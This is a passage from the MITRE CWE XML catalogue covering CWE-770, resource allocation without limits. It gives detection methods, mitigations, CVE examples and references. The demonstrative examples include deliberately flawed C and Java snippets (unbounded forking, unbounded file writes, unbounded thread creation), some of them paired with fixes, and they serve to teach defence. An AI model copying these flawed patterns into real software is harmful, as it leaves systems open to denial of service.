               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Potential_Mitigations, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, References,
						Relationships, Type</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="770" Name="Allocation of Resources Without Limits or Throttling" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The software allocates a reusable resource or group of
					resources on behalf of an actor without imposing any restrictions on how many
					resources can be allocated, in violation of the intended security policy for
					that actor.</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>665</Relationship_Target_ID>
               <!--Improper Initialization--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>400</Relationship_Target_ID>
               <!--Uncontrolled Resource Consumption ('Resource Exhaustion')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>840</Relationship_Target_ID>
               <!--Business Logic Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>857</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 12 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>858</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 13 - Serialization (SER)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>861</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 49 - Miscellaneous (MSC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>876</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>877</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>985</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Unrestricted Consumption--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>"Resource exhaustion" (CWE-400) is currently treated as a weakness,
						although it is more like a category of weaknesses that all have the same
						type of consequence. While this entry treats CWE-400 as a parent in view
						1000, the relationship is probably more appropriately described as a
						chain.</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
            <Introductory_Phase>System Configuration</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: resource consumption
						(CPU)</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: resource consumption
						(memory)</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: resource consumption
						(other)</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>When allocating resources without limits, an attacker could prevent
							other systems, applications, or processes from accessing the same type
							of resource.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-8">
               <Method_Name>Manual Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Manual static analysis can be useful for finding this weakness, but it
							might not achieve desired code coverage within limited time constraints.
							If denial-of-service is not considered a significant risk, or if there
							is strong emphasis on consequences such as code execution, then manual
							analysis may not focus on this weakness at all.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Fuzzing</Method_Name>
               <Method_Description>
                  <Text>While fuzzing is typically geared toward finding low-level
							implementation bugs, it can inadvertently find uncontrolled resource
							allocation problems. This can occur when the fuzzer generates a large
							number of test cases but does not restart the targeted software in
							between test cases. If an individual test case produces a crash, but it
							does not do so reliably, then an inability to limit resource allocation
							may be the cause.</Text>
                  <Text>When the allocation is directly affected by numeric inputs, then
							fuzzing may produce indications of this weakness.</Text>
               </Method_Description>
               <Method_Effectiveness>Opportunistic</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Certain automated dynamic analysis techniques may be effective in
							producing side effects of uncontrolled resource allocation problems,
							especially with resources such as processes, memory, and connections.
							The technique may involve generating a large number of requests to the
							software within a short time frame. Manual analysis is likely required
							to interpret the results.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Specialized configuration or tuning may be required to train automated
							tools to recognize this weakness.</Text>
                  <Text>Automated static analysis typically has limited utility in recognizing
							unlimited allocation problems, except for the missing release of
							program-independent system resources such as files, sockets, and
							processes, or unchecked arguments to memory. For system resources,
							automated static analysis may be able to detect circumstances in which
							resources are not released after they have expired, or if too much of a
							resource is requested at once, as can occur with memory. Automated
							analysis of configuration files may be able to detect settings that do
							not specify a maximum value.</Text>
                  <Text>Automated static analysis tools will not be appropriate for detecting
							exhaustion of custom resources, such as an intended security policy in
							which a bulletin board user is only allowed to make a limited number of
							posts per day.</Text>
               </Method_Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Clearly specify the minimum and maximum expectations for capabilities,
							and dictate which behaviors are acceptable when resource allocation
							reaches limits.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Limit the amount of resources that are accessible to unprivileged
							users. Set per-user limits for resources. Allow the system administrator
							to define these limits. Be careful to avoid CWE-410.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Design throttling mechanisms into the system architecture. The best
							protection is to limit the amount of resources that an unauthorized user
							can cause to be expended. A strong authentication and access control
							model will help prevent such attacks from occurring in the first place,
							and it will help the administrator to identify who is committing the
							abuse. The login application should be protected against DoS attacks as
							much as possible. Limiting the database access, perhaps by caching
							result sets, can help minimize the resources expended. To further limit
							the potential for a DoS attack, consider tracking the rate of requests
							received from users and blocking requests that exceed a defined rate
							threshold.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>This will only be applicable to cases where user input can influence
							the size or frequency of resource allocations.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Mitigation of resource exhaustion attacks requires that the target
							system either: </Text>
                  <Block Block_Nature="List">
                     <Text>recognizes the attack and denies that user further access for a
								given amount of time, typically by using increasing time
								delays</Text>
                     <Text>uniformly throttles all requests in order to make it more
								difficult to consume resources more quickly than they can again be
								freed. </Text>
                  </Block>
                  <Text>The first of these solutions is an issue in itself though, since it
							may allow attackers to prevent the use of the system by a particular
							valid user. If the attacker impersonates the valid user, he may be able
							to prevent the user from accessing the server in question. </Text>
                  <Text>The second solution can be difficult to effectively institute -- and
							even when properly done, it does not provide a full solution. It simply
							requires more resources on the part of the attacker. </Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that protocols have specific limits of scale placed on
							them.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-38.1">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If the program must fail, ensure that it fails gracefully (fails
							closed). There may be a temptation to simply let the program fail poorly
							in cases such as low memory conditions, but an attacker may be able to
							assert control before the software has fully exited. Alternately, an
							uncontrolled failure could cause cascading problems with other
							downstream components; for example, the program could send a signal to a
							downstream process so the process immediately knows that a problem has
							occurred and has a better chance of recovery.</Text>
                  <Text>Ensure that all failures in resource allocation place the system into
							a safe posture.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-47">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Limit Resource Consumption</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use resource-limiting settings provided by the operating system or
							environment. For example, when managing system resources in POSIX,
							setrlimit() can be used to set limits for certain types of resources,
							and getrlimit() can determine how many resources are available. However,
							these functions are not available on all operating systems. </Text>
                  <Text>When the current levels get close to the maximum that is defined for
							the application (see CWE-770), then limit the allocation of further
							resources to privileged users; alternately, begin releasing resources
							for less-privileged users. While this mitigation may protect the system
							from attack, it will not necessarily stop attackers from adversely
							impacting other users. </Text>
                  <Text>Ensure that the application performs the appropriate error checks and
							error handling in case resources become unavailable (CWE-703). </Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-25">
               <Intro_Text>This code allocates a socket and forks each time it receives a new
						connection.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Block>
                        <Code>sock=socket(AF_INET, SOCK_STREAM, 0);</Code>
                        <Code>while (1) {</Code>
                        <Block>
                           <Code>newsock=accept(sock, ...);</Code>
                           <Code>printf("A connection has been accepted\n");</Code>
                           <Code>pid = fork();</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                  </Block>
                  <Text>The program does not track how many connections have been made, and it
							does not limit the number of connections. Because forking is a
							relatively expensive operation, an attacker would be able to cause the
							system to run out of CPU, processes, or memory by making a large number
							of connections. Alternatively, an attacker could consume all available
							connections, preventing others from accessing the system
							remotely.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-50">
               <Intro_Text>In the following example a server socket connection is used to
						accept a request to store data on the local file system using a specified
						filename. The method openSocketConnection establishes a server socket to
						accept requests from a client. When a client establishes a connection to
						this service the getNextMessage method is first used to retrieve from the
						socket the name of the file to store the data, the openFileToWrite method
						will validate the filename and open a file to write to on the local file
						system. The getNextMessage is then used within a while loop to continuously
						read data from the socket and output the data to the file until there is no
						longer any data from the socket.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>int writeDataFromSocketToFile(char *host, int port)</Code>
                     <Code>{</Code>
                     <Block>
                        <Code/>
                        <Code>char filename[FILENAME_SIZE];</Code>
                        <Code>char buffer[BUFFER_SIZE];</Code>
                        <Code>int socket = openSocketConnection(host, port);</Code>
                        <Code/>
                        <Code>if (socket &lt; 0) {</Code>
                        <Block>
                           <Code>printf("Unable to open socket connection");</Code>
                           <Code>return(FAIL);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>if (getNextMessage(socket, filename, FILENAME_SIZE) &gt;
									0) {</Code>
                        <Block>
                           <Code>if (openFileToWrite(filename) &gt; 0) {</Code>
                           <Block>
                              <Code>while (getNextMessage(socket, buffer, BUFFER_SIZE)
											&gt; 0){</Code>
                              <Block>
                                 <Code>if (!(writeToFile(buffer) &gt; 0))</Code>
                                 <Block>
                                    <Code>break;</Code>
                                 </Block>
                              </Block>
                              <Code>}</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>closeFile();</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>closeSocket(socket);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This example creates a situation where data can be dumped to a file on
							the local file system without any limits on the size of the file. This
							could potentially exhaust file or disk resources and/or limit other
							clients' ability to access the service. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-51">
               <Intro_Text>In the following example, the processMessage method receives a two
						dimensional character array containing the message to be processed. The
						two-dimensional character array contains the length of the message in the
						first character array and the message body in the second character array.
						The getMessageLength method retrieves the integer value of the length from
						the first character array. After validating that the message length is
						greater than zero, the body character array pointer points to the start of
						the second character array of the two-dimensional character array and memory
						is allocated for the new body character array.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Comment>/* process message accepts a two-dimensional character array of
								the form [length][body] containing the message to be processed
								*/</Comment>
                     <Code>int processMessage(char **message)</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>char *body;</Code>
                        <Code/>
                        <Code>int length = getMessageLength(message[0]);</Code>
                        <Code/>
                        <Code>if (length &gt; 0) {</Code>
                        <Block>
                           <Code>body = &amp;message[1][0];</Code>
                           <Code>processMessageBody(body);</Code>
                           <Code>return(SUCCESS);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>else {</Code>
                        <Block>
                           <Code>printf("Unable to process message; invalid message
										length");</Code>
                           <Code>return(FAIL);</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This example creates a situation where the length of the body
							character array can be very large and will consume excessive memory,
							exhausting system resources. This can be avoided by restricting the
							length of the second character array with a maximum length check</Text>
                  <Text>Also, consider changing the type from 'int' to 'unsigned int', so that
							you are always guaranteed that the number is positive. This might not be
							possible if the protocol specifically requires allowing negative values,
							or if you cannot control the return value from getMessageLength(), but
							it could simplify the check to ensure the input is positive, and
							eliminate other errors such as signed-to-unsigned conversion errors
							(CWE-195) that may occur elsewhere in the code. </Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>unsigned int length = getMessageLength(message[0]);</Code>
                     <Code>if ((length &gt; 0) &amp;&amp; (length &lt;
								MAX_LENGTH)) {...}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-52">
               <Intro_Text>In the following example, a server object creates a server socket
						and accepts client connections to the socket. For every client connection to
						the socket a separate thread object is generated using the
						ClientSocketThread class that handles request made by the client through the
						socket.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public void acceptConnections() {</Code>
                     <Code/>
                     <Block>
                        <Code>try {</Code>
                        <Block>
                           <Code>ServerSocket serverSocket = new
										ServerSocket(SERVER_PORT);</Code>
                           <Code>int counter = 0;</Code>
                           <Code>boolean hasConnections = true;</Code>
                           <Code>while (hasConnections) {</Code>
                           <Block>
                              <Code>Socket client = serverSocket.accept();</Code>
                              <Code>Thread t = new Thread(new
											ClientSocketThread(client));</Code>
                              <Code>t.setName(client.getInetAddress().getHostName() + ":"
											+ counter++);</Code>
                              <Code>t.start();</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>serverSocket.close();</Code>
                        </Block>
                        <Code/>
                        <Code>} catch (IOException ex) {...}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>In this example there is no limit to the number of client connections
							and client threads that are created. Allowing an unlimited number of
							client connections and threads could potentially overwhelm the system
							and system resources.</Text>
                  <Text>The server should limit the number of client connections and the
							client threads that are created. This can be easily done by creating a
							thread pool object that limits the number of threads that are
							generated.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public static final int SERVER_PORT = 4444;</Code>
                     <Code>public static final int MAX_CONNECTIONS = 10; </Code>
                     <Code>...</Code>
                     <Code/>
                     <Code>public void acceptConnections() {</Code>
                     <Code/>
                     <Block>
                        <Code>try {</Code>
                        <Block>
                           <Code>ServerSocket serverSocket = new
										ServerSocket(SERVER_PORT);</Code>
                           <Code>int counter = 0;</Code>
                           <Code>boolean hasConnections = true;</Code>
                           <Code>while (hasConnections) {</Code>
                           <Block>
                              <Code>hasConnections = checkForMoreConnections();</Code>
                              <Code>Socket client = serverSocket.accept();</Code>
                              <Code>Thread t = new Thread(new
											ClientSocketThread(client));</Code>
                              <Code>t.setName(client.getInetAddress().getHostName() + ":"
											+ counter++);</Code>
                              <Code>ExecutorService pool =
											Executors.newFixedThreadPool(MAX_CONNECTIONS);</Code>
                              <Code>pool.execute(t);</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>serverSocket.close();</Code>
                        </Block>
                        <Code/>
                        <Code>} catch (IOException ex) {...}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>An unnamed web site allowed a user to purchase tickets for an event.
						A menu option allowed the user to purchase up to 10 tickets, but the back
						end did not restrict the actual number of tickets that could be
						purchased.</Intro_Text>
               <Demonstrative_Example_References>
                  <Reference>
                     <Reference_Author>Rafal Los</Reference_Author>
                     <Reference_Title>Real-Life Example of a 'Business Logic Defect' (Screen
								Shots!)</Reference_Title>
                     <Reference_PubDate>2011</Reference_PubDate>
                     <Reference_Link>http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581</Reference_Link>
                  </Reference>
               </Demonstrative_Example_References>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-4017</Observed_Example_Reference>
               <Observed_Example_Description>Language interpreter does not restrict the number
						of temporary files being created when handling a MIME request with a large
						number of parts..</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2726</Observed_Example_Reference>
               <Observed_Example_Description>Driver does not use a maximum width when invoking
						sscanf style functions, causing stack
						consumption.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2540</Observed_Example_Reference>
               <Observed_Example_Description>Large integer value for a length property in an
						object causes a large amount of memory
						allocation.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2054</Observed_Example_Reference>
               <Observed_Example_Description>Product allows exhaustion of file descriptors when
						processing a large number of TCP packets.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5180</Observed_Example_Reference>
               <Observed_Example_Description>Communication product allows memory consumption
						with a large number of SIP requests, which cause many sessions to be
						created.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-1700</Observed_Example_Reference>
               <Observed_Example_Description>Product allows attackers to cause a denial of
						service via a large number of directives, each of which opens a separate
						window.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-4650</Observed_Example_Reference>
               <Observed_Example_Description>CMS does not restrict the number of searches that
						can occur simultaneously, leading to resource
						exhaustion.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Theoretical_Notes>
            <Theoretical_Note>
               <Text>Vulnerability theory is largely about how behaviors and resources
						interact. "Resource exhaustion" can be regarded as either a consequence or
						an attack, depending on the perspective. This entry is an attempt to reflect
						one of the underlying weaknesses that enable these attacks (or consequences)
						to take place.</Text>
            </Theoretical_Note>
         </Theoretical_Notes>
         <References>
            <Reference>
               <Reference_Author>Joao Antunes</Reference_Author>
               <Reference_Author>Nuno Ferreira Neves</Reference_Author>
               <Reference_Author>Paulo Verissimo</Reference_Author>
               <Reference_Title>Detection and Prediction of Resource-Exhaustion
						Vulnerabilities</Reference_Title>
               <Reference_Publication>Proceedings of the IEEE International Symposium on
						Software Reliability Engineering (ISSRE)</Reference_Publication>
               <Reference_PubDate>November 2008</Reference_PubDate>
               <Reference_Link>http://homepages.di.fc.ul.pt/~nuno/PAPERS/ISSRE08.pdf</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>D.J. Bernstein</Reference_Author>
               <Reference_Title>Resource exhaustion</Reference_Title>
               <Reference_Link>http://cr.yp.to/docs/resources.html</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>Pascal Meunier</Reference_Author>
               <Reference_Title>Resource exhaustion</Reference_Title>
               <Reference_Publication>Secure Programming Educational
						Material</Reference_Publication>
               <Reference_PubDate>2004</Reference_PubDate>
               <Reference_Link>http://homes.cerias.purdue.edu/~pmeunier/secprog/sanitized/class1/6.resource%20exhaustion.ppt</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 17, "Protecting Against Denial of Service Attacks"
						Page 517</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference>
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 22 - Allocation of Resources Without
						Limits or Throttling</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-23</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/23/top-25-series-rank-22-allocation-of-resources-without-limits-or-throttling/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 10, "Resource Limits", Page 574.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Close resources when they are no longer
						needed</Mapped_Node_Name>
               <Mapped_Node_ID>FIO04-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Avoid memory and resource leaks during
						serialization</Mapped_Node_Name>
               <Mapped_Node_ID>SER12-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Do not exhaust heap space</Mapped_Node_Name>
               <Mapped_Node_ID>MSC05-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not assume infinite heap space</Mapped_Node_Name>
               <Mapped_Node_ID>MEM12-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure files are properly closed when they are no longer
						needed</Mapped_Node_Name>
               <Mapped_Node_ID>FIO42-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>119</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
